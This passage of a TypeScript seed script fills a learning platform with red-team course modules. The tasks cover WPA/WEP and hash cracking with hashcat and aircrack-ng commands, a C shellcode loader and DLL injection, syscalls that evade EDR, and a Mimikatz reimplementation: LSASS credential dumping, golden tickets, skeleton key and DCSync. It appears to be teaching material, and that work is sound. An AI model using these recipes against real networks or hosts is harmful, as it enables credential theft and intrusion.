		['Build WEP cracker', 'Collect weak IVs: aireplay-ng -3 -b <BSSID> wlan0mon (ARP replay). PTW attack needs ~40k packets. aircrack-ng -z capture.cap uses PTW. Fragmentation attack for faster IV generation.', '## WEP\n\nCollect IVs\nPTW attack\nFragmentation attack'],
		['Implement GPU acceleration', 'Use hashcat with GPU: hashcat -m 22000 -d 1 hash.22000 wordlist.txt. RTX 3090: ~1.2M WPA hashes/sec vs ~2K on CPU. Requires CUDA (NVIDIA) or OpenCL (AMD). 600x faster than CPU.', '## GPU\n\nHashcat integration\nCUDA/OpenCL\nMassive speedup'],
		['Add distributed cracking', 'Split keyspace: hashcat --skip N --limit M or use hashtopolis. Example: 4 machines each crack 25% of keyspace. Coordinate via central server, aggregate found passwords. Linear speedup with node count.', '## Distributed\n\nSplit workload\nCoordinate nodes\nAggregate results'],
	] as [string, string, string][] },
]);

// Reimplement: Password & WiFi Cracking (83)
expandPath(83, [
	{ name: 'Password Cracking', desc: 'Offline hash cracking', tasks: [
		['Implement hash identification', 'Detect type by: length (32=MD5, 40=SHA1, 64=SHA256), format ($1$=MD5crypt, $6$=SHA512crypt), prefix (NTLM: 32 hex, bcrypt: $2a$). Use hashid or hash-identifier tools as reference.', '## Identification\n\nByLength, format\nMagic numbers\nContext clues'],
		['Build dictionary attack', 'Load wordlist (rockyou.txt: 14M passwords). Hash each candidate, compare to target. Example: hashcat -m 0 -a 0 hash.txt rockyou.txt. Track progress, checkpoint for resume, show ETA.', '## Dictionary\n\nLoad wordlist\nHash and compare\nProgress tracking'],
		['Add mask attack', 'Define pattern: ?l=a-z, ?u=A-Z, ?d=0-9, ?s=special. Example: ?u?l?l?l?d?d?d = "Pass123". Increment: -i --increment-min=6 --increment-max=10. Custom charset: -1 abc ?1?1?1.', '## Mask\n\n?l?u?d?s\nCustom charsets\nIncremental lengths'],
		['Implement rule engine', 'Apply transformations: c=capitalize, $1=append 1, ^!=prepend !, r=reverse, sa@=replace a with @. Example: "password" + rules → "Password1!", "P@ssword", "DROWSSAP". Chains: hashcat -r rule1 -r rule2.', '## Rules\n\nJohn/Hashcat rules\nCombine with wordlist\nMultiple rules'],
		['Build hybrid attack', 'Wordlist + mask: hashcat -a 6 wordlist.txt ?d?d?d (append 3 digits). Or -a 7 ?s?s wordlist.txt (prepend 2 special). Example: "password" → "password123", "!!password". More efficient than pure brute force.', '## Hybrid\n\nBase word + pattern\nWord + digits\nEfficient approach'],
		['Add markov chains', 'Train on leaked passwords to learn character transition probabilities. Generate candidates in probability order (most likely first). hashcat: --markov-threshold. 3-5x faster than random brute force.', '## Markov\n\nLearn from passwords\nGenerate likely guesses\nFaster than brute'],
	] as [string, string, string][] },
	{ name: 'WiFi Cracking', desc: 'Wireless attacks', tasks: [
		['Capture WPA handshake', 'Monitor mode: airmon-ng start wlan0. Capture: airodump-ng -c 6 -w cap wlan0mon. Deauth to trigger: aireplay-ng -0 1 -a BSSID wlan0mon. Verify handshake captured in cap-01.cap.', '## Capture\n\nMonitor mode\nDeauth clients\nCapture EAPOL'],
		['Implement WPA cracking', 'PMK = PBKDF2(password, SSID, 4096, 256). PTK derives from PMK + nonces. Compute MIC, compare to captured. GPU: hashcat -m 22000 at ~600K/s on RTX 3090 vs ~2K/s on CPU.', '## WPA Crack\n\nPBKDF2-SHA1\nCompare to MIC\nGPU acceleration'],
		['Add PMKID attack', 'Capture PMKID from first EAPOL message (no client needed): hcxdumptool -i wlan0mon -o cap.pcapng. Convert: hcxpcapngtool -o hash.22000 cap.pcapng. Crack: hashcat -m 22000.', '## PMKID\n\nExtract from beacon\nNo handshake needed\nFaster attack'],
		['Build rainbow tables', 'Pre-compute PMKs for common SSIDs (linksys, NETGEAR, default). Store PMK→password mapping. Lookup is instant (milliseconds). Trade-off: 1TB can cover top 1000 SSIDs with 10M passwords each.', '## Rainbow\n\nPre-compute for SSIDs\nInstant lookup\nStorage tradeoff'],
		['Implement WEP cracking', 'Collect IVs with ARP replay: aireplay-ng -3 -b BSSID wlan0mon. Need ~40K packets for PTW attack. Crack: aircrack-ng -z capture.cap. WEP uses RC4, weak IVs reveal key bytes statistically.', '## WEP\n\nCollect IVs\nStatistical attack\nPTW method'],
		['Add online attacks', 'WPS brute force: reaver -i wlan0mon -b BSSID (11K PINs max). Pixie dust: reaver -K 1 (exploits weak random). Try defaults: admin/admin, password, 12345678. Check router model for known passwords.', '## Online\n\nWPS brute force\nPixie dust\nDefault passwords'],
	] as [string, string, string][] },
]);

// Red Team Tooling: C/C++ Fundamentals (52)
expandPath(52, [
	{ name: 'C/C++ Basics', desc: 'Language fundamentals', tasks: [
		['Set up development environment', 'Install Visual Studio with C++ workload or MinGW-w64. Configure CMakeLists.txt: cmake_minimum_required, project(), add_executable(). Set up WinDbg or GDB for debugging, configure symbols.', '## Setup\n\nVisual Studio or MinGW\nCMake for builds\nDebugger setup'],
		['Learn memory management', 'Understand: stack (local vars), heap (malloc/new), pointers (*ptr dereference, &var address). malloc(size)/free(ptr), new/delete. Memory layout: .text, .data, .bss, heap, stack. Avoid leaks and use-after-free.', '## Memory\n\nmalloc/free\nnew/delete\nMemory layout'],
		['Implement file operations', 'FILE* fp = fopen("file", "rb"); fread(buf, 1, size, fp); fclose(fp). Binary mode for shellcode. Memory mapping: CreateFileMapping + MapViewOfFile (Win) or mmap (Linux) for large files.', '## Files\n\nfopen, fread, fwrite\nBinary file handling\nMemory mapping'],
		['Add socket programming', 'Winsock: WSAStartup, socket(AF_INET, SOCK_STREAM, 0), connect/bind/listen/accept, send/recv. BSD similar without WSA. Build TCP client: connect to C2. TCP server: bind port, accept shells.', '## Sockets\n\nWinsock/BSD sockets\nTCP/UDP\nClient/server'],
		['Build process operations', 'CreateProcess(NULL, "cmd.exe", ...) to spawn processes. OpenProcess with PROCESS_ALL_ACCESS. VirtualAllocEx/WriteProcessMemory for injection. DuplicateHandle for handle manipulation.', '## Processes\n\nCreateProcess\nProcess injection\nHandle manipulation'],
		['Implement threading', 'CreateThread(NULL, 0, ThreadFunc, param, 0, &tid). Sync: CreateMutex, WaitForSingleObject, CreateEvent. Thread pool: QueueUserWorkItem or C++11 std::async. Avoid race conditions.', '## Threads\n\nCreateThread\nSynchronization\nThread pools'],
	] as [string, string, string][] },
	{ name: 'Offensive C/C++', desc: 'Security applications', tasks: [
		['Build shellcode loader', 'void* mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(mem, shellcode, size); ((void(*)())mem)(); Alternatively: CreateThread, callback functions, or fiber execution.', '## Loader\n\nVirtualAlloc\nmemcpy\nExecute in memory'],
		['Implement DLL injection', 'Classic: VirtualAllocEx in target, WriteProcessMemory with DLL path, CreateRemoteThread calling LoadLibraryA. Manual map: copy PE, resolve imports, call DllMain. Avoids LoadLibrary detection.', '## DLL Inject\n\nCreateRemoteThread\nLoadLibrary\nManual mapping'],
		['Add API hooking', 'IAT hook: modify Import Address Table entry. Inline hook: overwrite function prologue with JMP to hook (save original bytes). Microsoft Detours library for safe hooking. Hook NtCreateFile to monitor file access.', '## Hooks\n\nIAT hooking\nInline hooking\nDetour library'],
		['Build PE parser', 'Parse DOS header (e_magic=MZ), PE header (Signature=PE), Optional header (ImageBase, EntryPoint). Walk section headers (.text, .data). Parse Import Directory for DLL dependencies, Export Directory for functions.', '## PE\n\nParse headers\nSection enumeration\nImport/export tables'],
		['Implement syscalls', 'Bypass usermode hooks by calling ntdll syscalls directly. Read SSN from ntdll, build syscall stub: mov r10, rcx; mov eax, SSN; syscall; ret. Use SysWhispers tool to generate. Avoids EDR hooks.', '## Syscalls\n\nAvoid usermode hooks\nResolve SSN\nCall directly'],
		['Add anti-debug', 'IsDebuggerPresent() checks PEB.BeingDebugged. NtQueryInformationProcess for ProcessDebugPort. Timing: RDTSC, GetTickCount (debugger introduces delays). PEB.NtGlobalFlag (0x70 if debugger). Crash or exit if detected.', '## Anti-Debug\n\nIsDebuggerPresent\nPEB checks\nTiming checks'],
	] as [string, string, string][] },
]);

// Reimplement: Mimikatz (62)
expandPath(62, [
	{ name: 'Credential Extraction', desc: 'Memory extraction', tasks: [
		['Understand LSASS', 'LSASS (lsass.exe) is the Local Security Authority Subsystem. It handles authentication, stores NTLM hashes, Kerberos tickets, and sometimes plaintext passwords (WDigest). Protected Process Light (PPL) on newer Windows defends it.', '## LSASS\n\nLocal Security Authority\nStores credentials\nProtected process'],
		['Build LSASS accessor', 'Enable SeDebugPrivilege (admin required). OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid). Use NtReadVirtualMemory to read credential structures from LSASS memory.', '## Access\n\nSeDebugPrivilege\nOpenProcess\nRead memory'],
		['Implement sekurlsa module', 'Find credential structures: LogonSessionList, lsasrv!LogonSessionTable. Parse KIWI_MSV1_0_PRIMARY_CREDENTIALS for NTLM. Decrypt with 3DES/AES key from lsasrv. Extract usernames, domains, NTLM hashes.', '## Sekurlsa\n\nParse LSASS memory\nFind credential structures\nExtract passwords/hashes'],
		['Add wdigest extraction', 'WDigest stores reversible credentials when UseLogonCredential=1 (default on older Windows). Find KIWI_WDIGEST_CREDENTIALS in memory. Decrypt with wdigest!l_LogSessList key. Returns plaintext passwords.', '## Wdigest\n\nReversible encryption\nFind in memory\nDecrypt passwords'],
		['Build DPAPI module', 'DPAPI master keys decrypt credential files, browser passwords, WiFi passwords. Keys in %APPDATA%\\Microsoft\\Protect\\{SID}. Decrypt with user password or domain backup key (DPAPI_SYSTEM from DC).', '## DPAPI\n\nMaster keys\nCredential files\nDecryption'],
		['Implement Kerberos module', 'Find KIWI_KERBEROS_LOGON_SESSION in LSASS for cached tickets. Export TGT/TGS in .kirbi format (base64 encoded). Use for pass-the-ticket: inject into session for authentication without password.', '## Kerberos\n\nFind tickets in memory\nExport to file\nPass-the-ticket'],
	] as [string, string, string][] },
	{ name: 'Advanced Attacks', desc: 'Kerberos attacks', tasks: [
		['Build golden ticket', 'Forge TGT with krbtgt NTLM hash: kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash. Valid for 10 years by default. Complete domain compromise.', '## Golden\n\nkrbtgt hash\nForge TGT\n10-year validity'],
		['Implement silver ticket', 'Forge TGS with service account hash: /service:cifs /target:server.corp.com /rc4:hash. Access specific service without touching DC. Example: CIFS for file shares, HTTP for web services.', '## Silver\n\nService account hash\nForge TGS\nTarget specific service'],
		['Add skeleton key', 'misc::skeleton patches LSASS on DC. After patching, any account accepts "mimikatz" as password (in addition to real password). Survives until reboot. Very noisy but effective for persistence.', '## Skeleton\n\nPatch LSASS\nAny password works\nMaster key'],
		['Build DCSync', 'lsadump::dcsync /domain:corp.com /user:Administrator. Uses DRSUAPI replication protocol (what DCs use). Requires Replicating Directory Changes rights. Dumps all hashes without touching NTDS.dit file.', '## DCSync\n\nDRSGetNCChanges\nDump all hashes\nNo code on DC'],
		['Implement DCShadow', 'Register machine as temporary DC, push malicious changes (add admin, modify ACLs), then de-register. Changes replicate to real DCs. Very stealthy: looks like normal replication. Requires DA.', '## DCShadow\n\nRegister rogue DC\nPush malicious changes\nStealthy persistence'],
		['Add token manipulation', 'token::elevate for SYSTEM. token::duplicate copies token. token::impersonate uses stolen token. privilege::debug enables SeDebugPrivilege. Use to run commands as other users without their password.', '## Tokens\n\nDuplicate token\nImpersonate user\nPrivilege escalation'],
	] as [string, string, string][] },
]);

console.log('Done expanding remaining paths!');

const finalCount = db.prepare(`
	SELECT COUNT(*) as paths,
	(SELECT COUNT(*) FROM modules) as modules,
	(SELECT COUNT(*) FROM tasks) as tasks
	FROM paths
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final counts: ${finalCount.paths} paths, ${finalCount.modules} modules, ${finalCount.tasks} tasks`);

db.close();
